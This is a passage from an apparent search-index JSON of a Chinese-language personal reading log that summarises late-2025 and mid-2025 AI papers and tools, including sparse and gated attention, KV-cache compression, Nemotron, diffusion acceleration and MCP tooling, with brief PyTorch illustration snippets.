<li>VisAudio\uff1a\u57fa\u4e8e\u89c6\u9891\u7684\u53cc\u8033\u97f3\u9891\u751f\u6210\uff0c\u540c\u65f6\u8fd8\u505a\u4e86\u4e00\u4e2a\u6570\u636e\u96c6\uff0c\u5305\u542b\u4e86\u4e0a\u5343\u4e2a\u89c6\u9891+\u97f3\u9891\u7684\u6570\u636e\u96c6</li> </ul> </li> <li>https://arxiv.org/abs/2512.02556<ul> <li>DeepSeek V3.2\uff1a\u4e3b\u8981\u4ecb\u7ecd\u4e86\u5176\u4e2d\u7684\u7a00\u758f\u6ce8\u610f\u529b\u673a\u5236\uff0c\u4ee5\u53ca\u4e00\u4e9b\u5728RL\u4e2d\u7684\u7a33\u5b9a\u6027\u673a\u5236</li> <li>\u7a00\u758f\u6ce8\u610f\u529b\u673a\u5236\uff1aDSA\uff0c\u5148\u8d70\u4e00\u904d\u76f8\u5173\u5ea6\u8ba1\u7b97\uff0c\u968f\u540e\u9009\u62e9top-k\u7684key value\u8fdb\u884cattention\u8ba1\u7b97</li> <li>RL\u673a\u5236\uff1aGRPO\u7684\u6539\u8fdb\uff0c\u65e0\u504fKL\uff0cOff-policy \u5e8f\u5217\u63a9\u7801\uff0cKeep-Routing\uff0cKeep-Sampling-Mask</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2025-12/#128","title":"12.8","text":"<ul> <li>https://appletea233.github.io/think-while-edit/ <ul> <li>edit-thinker\uff1a\u901a\u8fc7\u4e00\u4e2aedit model+MLLM\u7684\u4ea4\u7ec7\u884c\u4e3a\uff0c\u8fdb\u884c\u5f3a\u5316\u5b66\u4e60\uff0c\u5b8c\u6210test time scaling\uff0c\u5148\u8fdb\u884cedit\uff0c\u7136\u540e\u518d\u7ecf\u8fc7MLLM\u7684\u5206\u6790\u7ed9\u51fa\u8c03\u6574\u7684\u6307\u4ee4\uff0c\u7ee7\u7eededit\uff0c\u76f4\u5230\u8fbe\u5230\u6807\u51c6</li> <li>\u4ee5GPT-4.1\u4e3a\u6559\u5e08\uff0c\u8bad\u7ec3\u4e86\u4e00\u4e2aMLLM\uff0c\u4f1a\u7ed9\u51fa\u6307\u4ee4\u8c03\u6574\uff0c\u4f5c\u4e3a\u4e00\u4e2a\u53ef\u63d2\u62d4\u7684\u7ec4\u4ef6\u548c\u5404\u79cdedit model\u653e\u5728\u4e00\u8d77\uff0c\u5e76\u4e14\u63d0\u5347\u6027\u80fd</li> </ul> </li> <li>https://arxiv.org/abs/2512.04810<ul> <li>EMMA\uff1a\u9ad8\u6548\u7684\u751f\u6210\u7406\u89e3\u7edf\u4e00\u6a21\u578b\uff0c\u6784\u5efa\u4e86\u4e00\u4e2a\u66f4\u9ad8\u538b\u7f29\u7387\u7684\u7f16\u7801\u5668\uff0c\u5e76\u4e14\u7a0d\u5fae\u4fee\u6539\u4e86\u6a21\u578b\u67b6\u6784</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2025-12/#1210","title":"12.10","text":"<ul> <li>https://arxiv.org/abs/2512.07461 <ul> <li>Native Parallel Reasoner\uff0c\u5e76\u884c\u63a8\u7406\u7684\u8bad\u7ec3</li> </ul> </li> </ul> <ul> <li>https://arxiv.org/abs/2512.07469<ul> <li>Unified Video Edit model \u5728video edit\u4e2d\u5f15\u5165\u4e86\u601d\u7ef4\u94fe\uff0c\u907f\u514d\u4e4b\u524d\u7684edit\u5de5\u4f5c\u8981\u5148\u4e00\u4e2a\u6a21\u578b\u505amask\u7684\u65b9\u6848\uff0c\u5c06\u5148mask\u518d\u7f16\u8f91\u7684\u65b9\u6848\u7edf\u4e00\u5230\u4e00\u4e2a\u6a21\u578b\u4e2d</li> </ul> </li> <li>https://arxiv.org/abs/2512.07778<ul> <li>DMVAE\uff0c\u5e38\u89c4\u7684Vae\u9075\u4ece\u9ad8\u65af\u7ea6\u675f\uff0c\u8fd9\u7bc7\u8bba\u6587\u5c1d\u8bd5\u663e\u5f0f\u5730\u7ea6\u675fVae\u538b\u7f29\u5730\u7a7a\u95f4\uff0c\u5e76\u4e14\u6d4b\u8bd5\u54ea\u4e9b\u7a7a\u95f4\u6d41\u5f62\u5bf9\u4e8e\u751f\u6210\u6700\u6709\u6548</li> </ul> </li> <li>https://arxiv.org/abs/2510.27688</li> <li>https://shaochenze.github.io/blog/2025/CALM/<ul> <li>CALM  \u8fd9\u662f\u4e00\u7bc7\u6bd4\u8f83\u65e9\u7684\u5de5\u4f5c\uff0c\u662f\u5728\u8fde\u7eed\u7a7a\u95f4\u5185\uff0c\u505a\u8bed\u8a00\u6a21\u578b\uff0c\u9884\u6d4b\u4e00\u4e2a\u8fde\u7eed\u5411\u91cf\u800c\u4e0d\u662f\u79bb\u6563\u7684</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2025-12/#1212","title":"12.12","text":"<ul> <li>https://arxiv.org/pdf/2512.08296<ul> <li>Agent Scaling\uff0cGoogle\u53d1\u8868\u7684\u7814\u7a76\uff0c\u7528\u6765\u5206\u6790Multi-Agent System\uff08MAS\uff09\uff0c\u5728Agent\u6570\u91cf\u6539\u52a8\u4ee5\u53ca\u901a\u4fe1\u673a\u5236\u53d8\u66f4\u7684\u60c5\u51b5\u4e0b\uff0c\u4f1a\u6709\u4ec0\u4e48\u6837\u7684\u6027\u80fd\u53d8\u5316\u3002\u505a\u4e86\u5f88\u591a\u6709\u6548\u7684\u6d88\u878d\u5b9e\u9a8c\uff0c\u5265\u79bb\u63d0\u793a\u8bcd\u5de5\u7a0b\u7684\u5f71\u54cd\uff0c\u6765\u771f\u6b63\u7684\u5206\u6790Multi-Agent system\u7684\u6027\u80fd</li> </ul> </li> </ul> <p>\u4ee5\u4e0a\u662f\u4e0d\u540c\u7684\u901a\u4fe1\u7b56\u7565</p> <p></p> <p>\u8fd9\u662fMAS\u5728\u4e0d\u540c\u4efb\u52a1\u4e0a\u7684\u5f71\u54cd\uff0c\u4e8e\u5355\u4e2aAgent\u7cfb\u7edf\uff08SAS\uff09\u76f8\u6bd4</p>"},{"location":"reading/dailyreading/2025-12/#1215","title":"12.15","text":"<ul> <li>https://zhuanlan.zhihu.com/p/1982065391216923209<ul> <li>CLIP\u5230Qwen3-Omni\uff0c\u591a\u6a21\u6001\u6a21\u578b\u7684\u878d\u5408\u7684\u4e00\u4efd\u7efc\u8ff0</li> </ul> </li> <li>https://arxiv.org/abs/2512.11749<ul> <li>SVG-T2I\uff0cKling\u7684\u5de5\u4f5c\uff0cRAE\u7684\u884d\u751f\u5de5\u4f5c\uff0c\u4e0d\u6b62\u5728ImageNet\uff0c\u5728\u9ad8\u5206\u8fa8\u7387\u573a\u666f\u4e0b\uff0c\u505a\u65e0VAE\u7684\u751f\u6210\u6a21\u578b\uff0c\u4f7f\u7528DINO-v3\u7684\u7279\u5f81</li> </ul> </li> <li>https://cdn.openai.com/pdf/41df8f28-d4ef-43e9-aed2-823f9393e470/circuit-sparsity-paper.pdf<ul> <li>OpenAI\u7684\u5de5\u4f5c\uff0c\u6781\u81f4\u7a00\u758f\u7684\u795e\u7ecf\u7f51\u7edc\uff0c\u53ef\u80fd\u662f\u53ef\u89e3\u91ca\u6027\u7684\u7a81\u7834\u53e3\uff0c\u5168\u8fde\u63a5\u5c42\u7684\u7279\u6027\u5bfc\u81f4\u5176\u7684\u9ed1\u76d2\u72b6\u6001</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2025-12/#1216","title":"12.16","text":"<p>\u770b\u5230\u4e00\u7bc7\u5e16\u5b50\uff0c\u662f\u5bf9nips 2025\u505a\u7684\u67b6\u6784\u6539\u8fdb\u7684\u603b\u7ed3</p> <ul> <li>Attention<ul> <li>Gated Attention Qwen\u7684\u5de5\u4f5c\uff0c\u5728attention\u8ba1\u7b97\u4e2d\u589e\u52a0\u4e00\u4e2a\u95e8\u63a7\u6a21\u5757\uff0c\u56e0\u4e3a\u6bcf\u6b21softmax\u8ba1\u7b97\u7684\u52a0\u6743\u548c\u90fd\u4e3a1\uff0c\u4f46\u662f\u5e76\u4e0d\u662f\u6bcf\u6b21\u7684Q\u90fd\u548cKey\u90fd\u6709\u8db3\u591f\u7684\u8054\u7cfb\uff0c\u56e0\u6b64\u6709\u65f6\u5019attention\u8ba1\u7b97\u5f15\u5165\u4e86\u4e0d\u5c11\u566a\u97f3</li> <li>\u6838\u5fc3\u64cd\u4f5c\u5728\u4e8e\u5728Attention\u8ba1\u7b97\u4e4b\u540e\uff0c\u5229\u7528gate score\u8fdb\u884c\u52a0\u6743</li> </ul> </li> </ul> <p></p> <pre><code>attn_output = torch.matmul(attn_weights, V)\n# attn_output: [batch_size, num_heads, seq_len, head_dim]\n\n# 6. \u5e94\u7528\u95e8\u63a7\u673a\u5236 - element-wise\u52a0\u6743\n# gate_scores\u9700\u8981reshape\u4ee5\u5339\u914dattn_output\u7684\u7ef4\u5ea6\ngate_scores = gate_scores.transpose(1, 2).unsqueeze(-1)\n# gate_scores: [batch_size, num_heads, seq_len, 1]\n\n# Element-wise multiplication\ngated_output = attn_output * gate_scores\n</code></pre> <ul> <li> <p>FFN</p> </li> <li> <p>KV-cache</p> <ul> <li>MTLA Multi-head temporal latent attention \u5728\u65f6\u95f4\u7ef4\u5ea6\u4e0a\u538b\u7f29KV-cache\uff0c\u8fd9\u4e2a\u5de5\u4f5c\u57fa\u4e8eDeepseek\u7684MLA</li> <li>\u8fd9\u79cd\u65b9\u6848\u4e0d\u662fTraining-Free\u7684\uff0c\u5f15\u5165\u4e86\u6295\u5f71\u5c42\u7684\u6765\u505a\u964d\u91c7\u6837</li> <li>DeepSeek\u7684MLA\u4e5f\u662f\u4e00\u4e2a\u7528\u4e8e\u4f18\u5316KV-cache\u5b58\u50a8\u7684\u5de5\u4f5c\uff0c\u7528low-rank\u5206\u89e3\u7684\u65b9\u6848\uff0c\u5b58\u50a8KV\u77e9\u9635\u7684\u4f4e\u79e9\u5206\u89e3\uff0c\u53ef\u4ee5\u8fbe\u52304-6\u500d\u7684\u538b\u7f29\u7387</li> </ul> </li> </ul> <p>\u4f46\u662f\u8fd9\u4e2a\u505a\u6cd5\u5e76\u4e0d\u591fMake Sense\uff0c\u5c24\u5176\u662f\u5728NLP\u4efb\u52a1\u4e0a\uff0c\u5f15\u5165\u4e86\u8fc7\u5f3a\u7684\u5148\u9a8c\uff0c\u56e0\u4e3a\u5e76\u4e0d\u662f\u76f8\u90bb\u7684\u4e24\u4e2atoken\uff0c\u5c31\u662f\u6709\u8db3\u591f\u7684\u76f8\u5173\u6027\uff0c\u8db3\u4ee5\u8ba9\u5b83\u4eec\u538b\u7f29\u5230\u4e00\u4e2a\u66f4\u5c0f\u7684\u7a7a\u95f4\uff0c\u8fd9\u4e2a\u505a\u6cd5\u5f80\u5f80\u4f1a\u5e26\u6765\u6bd4\u8f83\u5927\u7684\u6027\u80fd\u635f\u5931</p> <pre><code># KV cache \u66f4\u65b0\ndef update(self, kv_norm_t, k_pe, layer_idx, abs_length):\n    T = infer_steps  # \u5f53\u524d\u603btoken\u6570\n    T_remain = T % self.down_rate  # \u5f53\u524d\u5728\u5757\u5185\u7684\u4f4d\u7f6e\n\n    if T_remain != 1:\n        # \u5728\u540c\u4e00\u4e2a\u5757\u5185\uff1a\u7d2f\u52a0\u66f4\u65b0\n        prev_kv_t[:, -1:] += kv_norm_t\n        prev_k_pe[:, -1:] = k_pe\n    else:\n        # \u65b0\u5757\u5f00\u59cb\uff1a\u8ffd\u52a0\u65b0\u7684cache entry\n        prev_kv_t = torch.cat([prev_kv_t, kv_norm_t], dim=1)\n        prev_k_pe = torch.cat([prev_k_pe, k_pe], dim=1)\n\n\n# \u8fed\u4ee3\u751f\u6210\nif seqlen &gt; 1:\n    if self.recompute_prompt_attn:\n        # \u5b8c\u6574\u8ba1\u7b97prompt\u7684\u6ce8\u610f\u529b\n        w_tT = self.hypernet_down(T, t, train=True, ...)\n        kv_norm_t = matmul(w_tT * zero_mask, kv_norm)\n        # \u4f46\u53ea\u7f13\u5b58\u964d\u91c7\u6837\u540e\u7684indices\n        past_key_value.update(prev_kv_t[:, indices], ...)\n    else:\n        # \u76f4\u63a5\u53ea\u7f13\u5b58\u964d\u91c7\u6837\u4f4d\u7f6e\n        kv_norm_t = matmul(w_tT * zero_mask[indices], kv_norm)\n</code></pre> <p></p> <ul> <li>Nemotron\uff0cnvidia\u5f00\u6e90\u7684\u5927\u6a21\u578b\uff0c\u76f8\u6bd4\u4e8e\u5e02\u9762\u4e0a\u7684\u5f00\u6e90\u5927\u6a21\u578b\u505a\u4e86\u8f83\u5927\u7684\u6539\u52a8<ul> <li>\u67b6\u6784\uff1a\u5c06Moe\u5c42\u548cMamba-2\u6df7\u5408\uff0c\u964d\u4f4e\u6210\u672c\uff0c\u65e0\u9700\u7ef4\u62a4KV-cache\uff08\u56e0\u4e3a\u5927\u91cf\u7684\u5c42\u90fd\u4f7f\u7528\u4e86mamba\uff0c\u53ea\u6709\u5c11\u90e8\u5206\u5c42\u4f7f\u7528Attention\u7684\u9700\u8981\u7ef4\u62a4KV-cache\uff09</li> <li>\u67b6\u6784\uff1alatent-moe\uff0c\u5728\u8fdb\u884c\u4e13\u5bb6\u8def\u7531\u4e4b\u524d\uff0c\u5148\u8fdb\u884c\u964d\u7ef4\uff0c\u518d\u8ba1\u7b97\u5b8c\u6210\u4e4b\u540e\u8fdb\u884c\u5347\u7ef4</li> <li>\u63a8\u7406\uff1aMTP multi-token prediction</li> <li>\u8bad\u7ec3\uff1aNVFP4\u8bad\u7ec3</li> <li>Long Context\uff0c\u4f7f\u7528mamba\u5c42\u6765\u907f\u514dRope\u7684\u6269\u5c55\u9000\u5316\uff0cmamba\u4f5c\u4e3a\u7ef4\u62a4\u4e00\u4e2a\u72b6\u6001\u7684\u9012\u5f52\u795e\u7ecf\u7f51\u7edc\uff0c\u5176\u5929\u7136\u6709\u4f4d\u7f6e\u7f16\u7801\u7684\u80fd\u529b\uff08\u56e0\u4e3a\u65e9\u8fdb\u5165\u7f51\u7edc\u7684token\u8870\u51cf\u5f97\u66f4\u591a\uff09</li> </ul> </li> </ul> <p>\u73b0\u9636\u6bb5Mamba\u76f8\u6bd4\u4e8e\u4e00\u4e9bSLA\u7684\u9879\u76ee\uff0c\u6709\u66f4\u52a0\u6210\u719f\u7684\u7b97\u5b50\u5e93\uff0c\u56e0\u6b64\u5f88\u591a\u7cfb\u7edf\u90fd\u9002\u7528Mamba+Attention\u7684\u64cd\u4f5c</p> <p></p> <p></p> <p></p>"},{"location":"reading/dailyreading/2025-12/#1220","title":"12.20","text":"<ul> <li>https://arxiv.org/abs/2512.13507<ul> <li>Seedance 1.5 pro\uff1a\u5148\u8fdb\u7684\u97f3\u89c6\u9891\u540c\u51fa\u6a21\u578b\uff0c\u53ef\u4ee5\u501f\u8fd9\u4e2a\u6a21\u578b\u611f\u53d7\u4e00\u4e0b\u97f3\u89c6\u9891\u540c\u51fa\u6a21\u578b\u73b0\u5728\u7684\u662f\u600e\u4e48\u505a\u7684</li> </ul> </li> <li>https://arxiv.org/pdf/2512.15603<ul> <li>Qwen-image-layered: \u4e2a\u4eba\u8ba4\u4e3a\u662f\u4e00\u4e2a\u975e\u5e38\u7528\u5e94\u7528\u573a\u666f\u7684\u6a21\u578b\uff08\u8fd9\u79cd\u529f\u80fd\u5e94\u8be5\u5728\u4f20\u7edfcv\u91cc\u5c31\u6709\u4eba\u505a\u4e86\uff09\uff0c\u8be5\u6a21\u578b\u5df2\u7ecf\u5f00\u6e90\u6743\u91cd\uff0c\u5176\u4f5c\u7528\u662f\u5c06\u751f\u6210\u597d\u7684\u56fe\u50cf\u8fdb\u884c\u81ea\u52a8\u5206\u5c42</li> <li>\u533a\u522b\u5728\u4e8e\u4f20\u7edf\u7684\u505a\u6cd5\u7cbe\u5ea6\u6bd4\u8f83\u4f4e\uff0c\u5e76\u4e14\u65e0\u6cd5\u901a\u8fc7\u8bed\u4e49\u63cf\u8ff0\u8fdb\u884c\u5206\u5272\uff1b\u4f46\u662f\u76f8\u6bd4\u4e8e\u4ee5\u524d\u7684\u6a21\u578b\uff0cQwen-image-layered\u662f\u4e00\u4e2a\u5f88\u5927\u7684\u6a21\u578b\uff0c\u5176\u8d44\u6e90\u6d88\u8017\u4e5f\u5927\u5f97\u591a</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2025-12/#1222","title":"12.22","text":"<ul> <li>https://arxiv.org/pdf/2512.13687<ul> <li>MiniMax \u63d0\u51fa\u7684\u4e00\u79cd\u65b0\u578b\u7684vision tokenizer\uff0c\u5bf9\u6bd4VAE\uff0c\u5176\u80fd\u591f\u66f4\u597d\u7684scale\uff0c\u9488\u5bf9VAE\u7684\u5947\u602a\u73b0\u8c61\uff08\u6307\u4e00\u662f\u6570\u636e\u7684scale\u65e0\u6cd5\u4fc3\u8fdb\u91cd\u5efa\u6548\u679c\u7684\u63d0\u9ad8\uff0c\u4e8c\u662f\u91cd\u5efa\u6548\u679c\u7684\u63d0\u9ad8\u4e5f\u65e0\u6cd5\u4f7f\u5f97\u751f\u6210\u7684\u6548\u679c\u53d8\u597d\uff09<ul> <li>VAE\u7684\u7279\u6027\uff1a\u53ea\u5173\u6ce8\u91cd\u5efa\uff0c\u8fc7\u5ea6\u5173\u6ce8\u5e95\u5c42\u7eb9\u7406 -&gt; latent space \u4e00\u5b9a\u8981\u5173\u6ce8high-level\u8bed\u4e49</li> <li>VTP\uff1a\u540c\u65f6\u4f18\u5316\u6587\u672c-\u56fe\u50cf\u5bf9\u9f50\uff0c\u81ea\u76d1\u7763\uff0c\u91cd\u5efa\u4e09\u79cd\u635f\u5931\uff0c\u6784\u5efa\u66f4\u52a0\u4f18\u8d28\u7684latent space</li> </ul> </li> <li>VTP\u7684\u8bad\u7ec3<ul> <li>\u6a21\u578b\u67b6\u6784\uff1a\u7528\u7684\u662fvit</li> <li>\u8bad\u7ec3\u76ee\u6807\uff1aVision reconstruction(VAE) + Self supervised learning(like DINO v2) + Contrastive learning(Clip) </li> </ul> </li> </ul> </li> </ul> <ul> <li>https://github.com/thu-ml/TurboDiffusion<ul> <li>TurboDiffusion\uff0c\u4e00\u7bc7efficient diffusion\u7684\u5de5\u4f5c\uff0c\u7ec4\u5408\u4e86\u4e00\u4e2a\u4f18\u5316\u65b9\u6848\uff0c\u4f7f\u5f97video generation\u63a8\u7406\u901f\u5ea6\u52a0\u5feb\u4e86\u4e0a\u767e\u500d\uff0c\u4f8b\u5982\u57285090\u4e0a\u6267\u884cwan 2.1 1.3B 480P \u53ef\u4ee5\u8fbe\u52301.9s\u7684\u751f\u6210\u901f\u5ea6</li> <li>\u7ec4\u5408\u4e86SageAttention + SLA + rCM \u84b8\u998f + W8A8 \u91cf\u5316</li> </ul> </li> <li>https://arxiv.org/pdf/2512.17901<ul> <li>Law of Reasoning \u4ece\u63a8\u7406\u672c\u8eab\u5165\u624b\u5206\u6790reasoning model\uff0c\u662f\u5426\u5bf9\u4e8e\u590d\u6742\u95ee\u9898\uff0c\u6d88\u8017\u7684token\u7ebf\u5f62\u589e\u957f\uff0c\u662f\u5426\u5bf9\u4e8e\u7ec4\u5408\u7684\u95ee\u9898\uff0c\u6d88\u8017\u7684token\u548c\u5206\u522b\u89e3\u51b3\u8fd9\u4e24\u4e2a\u95ee\u9898\u76f8\u4f3c\uff0c\u8bba\u6587\u53d1\u73b0\u7ec4\u5408\u7684\u95ee\u9898\u4f1a\u5bfc\u81f4reasoning\u6d88\u8017\u7684token\u8fc7\u5ea6\u589e\u957f\uff0c\u9488\u5bf9\u8fd9\u79cd\u73b0\u8c61\uff0c\u5408\u6210\u4e86\u4e00\u6ce2\u6570\u636e\u89e3\u51b3<ul> <li>\u4f46\u662f\u4e2a\u4eba\u8ba4\u4e3a\u8fd9\u7bc7\u8bba\u6587\u7684\u601d\u8003\u5e76\u4e0d\u662f\u5f88make sense\uff0c\u4e00\u6765\u672c\u8eab\u8fd9\u4e9b\u95ee\u9898\u5f88\u5c11\u51fa\u73b0\u5728\u8bed\u5883\u4e2d\uff0c\u4e8c\u6765\u8fd9\u79cd\u89e3\u51b3\u65b9\u6848\u4e5f\u4e0d\u662f\u5f88\u4f18\u96c5\uff0c\u4e2a\u4eba\u611f\u89c9\u8fd8\u662f\u5f97\u4f9d\u8d56RL\u7684\u7b97\u6cd5\u6765\u89e3\u51b3\u8fd9\u7c7b\u95ee\u9898\uff0c\u8fd9\u79cd\u9020\u7279\u5b9a\u6570\u636e\u89e3\u51b3\u7279\u5b9a\u73b0\u8c61\u611f\u89c9\u662f\u5728\u6253\u8865\u4e01</li> </ul> </li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2025-12/#1228","title":"12.28","text":"<ul> <li>https://dreamontage.github.io/DreaMontage/<ul> <li>dreamontage \u5b57\u8282\u65b0\u51fa\u7684\u89c6\u9891\u751f\u6210\u6a21\u578b\uff0c\u652f\u6301\u5185\u90e8\u4efb\u610f\u5e27\u7684\u63a7\u5236\uff0c\u66f4\u52a0\u7075\u6d3b\u7684\u89c6\u9891\u751f\u6210</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2025-12/#1229","title":"12.29","text":"<ul> <li>https://zhuanlan.zhihu.com/p/1988221694591128167<ul> <li>\u8fd9\u662f\u4e00\u7bc7\u6709\u5173\u4e8eLLM\u63a8\u7406\u67b6\u6784\u6f14\u5316\u7684\u535a\u5ba2</li> <li>\u4eceStatic batching -&gt; Continuous batching (Paged Attention) -&gt; Chunked Prefill -&gt; PD\u5206\u79bb\uff08Prefill\u548cDecoder\u5206\u79bb\uff09 -&gt; AF\u5206\u79bb\uff08Attention\u548cFFN\u5206\u79bb\uff09\u8fd9\u91cc\u7684\u5206\u79bb\u90fd\u662f\u4f7f\u7528\u786c\u4ef6\u7684\u5206\u79bb\uff0c\u53d1\u6325\u4e0d\u540c\u7279\u6027\u786c\u4ef6\u7684\u4e13\u957f\u5e76\u4e14\u4f18\u5316\u901a\u4fe1</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2025-6/","title":"2025.6","text":""},{"location":"reading/dailyreading/2025-6/#617","title":"6.17","text":"<ul> <li>https://arxiv.org/abs/2506.10821<ul> <li>Video deep research: \u4f7f\u7528\u5de5\u5177+\u63a8\u7406\u6a21\u578b\u6784\u5efaagent\uff0c\u53ef\u4ee5\u5728\u89c6\u9891\u7406\u89e3\u4efb\u52a1\u4e0a\u8d85\u8d8a\u6700\u5f3a\u7684\u591a\u6a21\u6001\u6a21\u578b</li> </ul> </li> <li>https://arxiv.org/pdf/2502.14855<ul> <li>Prompt-to-Leaderboard\uff1a\u8bad\u7ec3LLM\uff0c\u6784\u5efaLLM-judge\uff0c\u80fd\u591f\u6784\u5efa\u7ec6\u7c92\u5ea6 or \u7279\u5b9a\u573a\u666f\u7684benchmark</li> <li>\u8fd9\u4e2a\u7406\u89e3\u53ef\u80fd\u4e0d\u591f\u51c6\u786e\uff0c\u539f\u8bba\u6587\u4e2d\u6709\u8be6\u7ec6\u6570\u5b66\u63a8\u5bfc</li> </ul> </li> <li>https://app.pageon.ai/presentation/75305<ul> <li>\u6784\u5efaPPT\u7684\u5de5\u5177</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2025-6/#618","title":"6.18","text":"<ul> <li>https://www.arxiv.org/abs/2506.13585<ul> <li>MiniMax-M1 \u4f7f\u7528\u4e86lightning attention\uff0c\u5e76\u4e14\u63d0\u51fa\u4e86\u4e00\u79cd\u65b0\u7684RL\u7b97\u6cd5</li> </ul> </li> <li>https://github.com/mindsdb/mindsdb<ul> <li>\u5f00\u6e90\u7684\u9ad8star\u7684AI DB \u8fde\u63a5\u5668\uff0c\u4e13\u95e8\u9488\u5bf9\u8d85\u5927\u89c4\u6a21\u6570\u636e\uff0c\u5185\u7f6eMCP</li> </ul> </li> <li>https://arxiv.org/abs/2506.14728<ul> <li>Alita \u4f5c\u8005\u7684\u540e\u7eed\u5de5\u4f5c\uff0c\u57fa\u4e8eMCP\u7684Agent\u84b8\u998f\uff0c\u8ba9\u6559\u5e08Agent\u5c06\u81ea\u5df1\u7684\u80fd\u529b\u6574\u7406\u6210\u51e0\u4e2aMCP\u8ba9\u5b66\u751fAgent\u96c6\u6210</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2025-6/#619","title":"6.19","text":"<ul> <li>https://mp.weixin.qq.com/s/dgJeGezpctJ03o_hJ4KSwg<ul> <li>Pine AI \u521d\u521b\u7684\u4e00\u4e2a\u6f14\u8bb2\uff0c\u4e3b\u8981\u5185\u5bb9\u662f\u5173\u4e8e\u73b0\u9636\u6bb5AI agent\u7684\u4e00\u4e9binsight<ul> <li>Pine AI \u4e3b\u8981\u4e1a\u52a1\u662f\u8ba9Agent\u53bb\u5e2e\u7528\u6237\u53bb\u6253\u5ba2\u670d\u7535\u8bdd</li> <li>\u5176\u5bf9AI agent\u73b0\u9636\u6bb5\u7684\u843d\u5730\u7684\u4e24\u4e2a\u95ee\u9898\uff0c\u4e00\u4e2a\u662f\u901f\u5ea6\u548c\u7cbe\u5ea6\u65e0\u6cd5\u540c\u65f6\u517c\u987e\uff0c\u4e00\u4e2a\u662f\u65e0\u6cd5\u4ece\u7ecf\u9a8c\u4e2d\u5b66\u4e60</li> <li>\u957f\u601d\u8003\u6a21\u578b\u592a\u6162\uff0c\u4e0d\u652f\u6301\u5b9e\u65f6\u4ea4\u4e92\uff0c\u5feb\u601d\u8003\u53c8\u4e0d\u8db3\u591f\u652f\u6301\u6709\u6548\u51b3\u7b56</li> <li>\u7ecf\u9a8c\u4e2d\u5b66\u4e60\u548c\u4eba\u673a\u4ea4\u4e92\u662f\u73b0\u9636\u6bb5Benchmark\u4e2d\u7f3a\u4e4f\u7684\u90e8\u5206\uff0c\u540c\u65f6\u7ecf\u9a8c\u4e2d\u5b66\u4e60\u7684\u8303\u5f0f\u4e5f\u662f\u52a0\u901f\u7684\u4e00\u6761\u8def\u5f84</li> </ul> </li> <li>\u968f\u540e\u4ed6\u4e5f\u8bb2\u8ff0\u4e86\u89e3\u51b3\u8fd9\u4e24\u4e2a\u95ee\u9898\u7684\u6280\u672f\u65b9\u6848<ul> <li>\u54cd\u5e94\u901f\u5ea6\uff1a\u5feb\u6162\u601d\u8003\u76f8\u7ed3\u5408\uff0c\u5feb\u601d\u8003\u6a21\u578b\u548c\u6162\u601d\u8003\u6a21\u578b\u540c\u65f6\u8fd0\u884c\uff0c\u5728\u6162\u601d\u8003\u6a21\u578b\u5728\u51b3\u7b56\u7684\u65f6\u5019\uff0c\u5feb\u601d\u8003\u6a21\u578b\u5e94\u8be5\u5feb\u901f\u54cd\u5e94\u6765\u5728\u67d0\u4e9b\u65f6\u5019\u62d6\u5ef6\u65f6\u95f4\uff0c\u4f8b\u5982\u8be2\u95ee\u66f4\u8be6\u7ec6\u7684\u7ec6\u8282\uff0c\u9700\u8981\u4f9d\u8d56SFT+RL\u6765\u5b9e\u73b0\u4e24\u4e2amodel\u7684\u914d\u5408</li> <li>\u54cd\u5e94\u901f\u5ea6\uff1a\u5199\u4ee3\u7801\u6765\u52a0\u901f\uff0c\u5c06\u4efb\u52a1\u56fa\u5316\u6210\u4e00\u4e2aRPA\u8f68\u8ff9\uff0c\u6765\u5b9e\u73b0\u52a0\u901f\uff0c\u8fd9\u4e2a\u8f68\u8ff9\u9700\u8981\u6709\u8db3\u591f\u7684\u590d\u7528\u6027</li> <li>\u7ecf\u9a8c\u79ef\u7d2f\uff1a\u4f18\u79c0\u7684\u77e5\u8bc6\u5e93\u8bbe\u8ba1\uff08memory\uff09</li> </ul> </li> </ul> </li> <li>https://arxiv.org/pdf/2406.12045<ul> <li>Tau-bench: \u6d4b\u8bd5LLM\u7684 tool call \u80fd\u529b\u548c\u7279\u5b9a\u9886\u57df\u89c4\u5219\u638c\u63e1\u80fd\u529b\uff0cBench\u4e2d\u63d0\u4f9b\u4e86\u5de5\u5177\u7684API\u548cPrompt\uff0cLLM\u9700\u8981\u57fa\u4e8e\u8fd9\u4e9b\u5185\u5bb9\u6765\u5b8c\u6210\u4e00\u4e9b\u4e13\u4e1a\u9886\u57df\u7684\u95ee\u7b54\u670d\u52a1</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2025-6/#620","title":"6.20","text":"<ul> <li> <p>https://arxiv.org/abs/2503.23278</p> <ul> <li>\u4e00\u7bc7\u5173\u4e8eMCP\u6280\u672f\u7684\u7efc\u8ff0\uff0c\u4e3b\u8981\u8bb2\u8ff0\u4e86\u5173\u4e8eMCP server\u53ef\u80fd\u51fa\u73b0\u7684\u4e00\u4e9b\u95ee\u9898\uff0c\u4f8b\u5982\u6076\u610f\u7684\u5de5\u5177Prompt\uff0c\u9694\u79bb\u6027\u66f4\u597d\u7684\u5de5\u5177\u8fd0\u884c\u73af\u5883\uff0c\u7248\u672c\u7ba1\u7406\u548c\u6743\u9650\u7ba1\u7406</li> </ul> </li> <li> <p>https://www.speakeasy.com/product/mcp-server</p> </li> <li>https://www.stainless.com/</li> </ul> <p>\u8fd9\u4e24\u4e2a\u5e73\u53f0\u90fd\u662f\u4eceAPI\u5e2e\u4f60\u751f\u6210\u6587\u6863\u548cMCP servers\uff0c\u4f46\u90fd\u662f\u95ed\u6e90\u7684</p> <ul> <li>https://github.com/metorial/mcp-containers<ul> <li>\u5c06\u6570\u767e\u4e2a\u4e3b\u6d41mcp server\u90fd\u5404\u81ea\u6253\u5305\u6210docker\uff0c\u63d0\u4f9b\u9694\u79bb\u7684\u73af\u5883</li> </ul> </li> <li>https://arxiv.org/abs/2506.05813<ul> 